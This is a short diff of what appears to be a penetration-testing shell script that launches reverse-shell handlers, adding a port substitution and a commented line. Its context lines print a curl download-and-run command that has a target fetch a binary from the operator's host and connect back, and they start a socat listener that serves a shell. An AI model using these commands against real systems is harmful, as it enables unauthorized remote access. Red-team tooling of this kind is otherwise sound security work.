@@ -67,6 +67,7 @@ cp ${SCRIPT}.tpl ${SCRIPT}
 if [[ "$GITAR" ]]; then
     echo "[+] gitar shortcuts enabled on reverse shell"
     sed -i "s/GITAR_HOST/${LHOST}/g" ${SCRIPT}
+    sed -i "s/GITAR_PORT/${WEBPORT}/g" ${SCRIPT}
     echo "[+] launch gitar server"
     tmux split-window -h "gitar -e ${LHOST} -p ${WEBPORT}"
 else
@@ -96,6 +97,8 @@ else
         echo "curl -O ${LHOST}:${WEBPORT}/${BINARY} && chmod +x ${BINARY} && ./${BINARY} ${LHOST}:${LPORT}"
     fi
 fi
+
+# echo "[*] Enjoy meal!"
 
 if [[ "$WINDOWS" ]]; then
     socat OPENSSL-LISTEN:${LPORT},cert=server.pem,verify=0,reuseaddr,fork EXEC:./${SCRIPT},pty
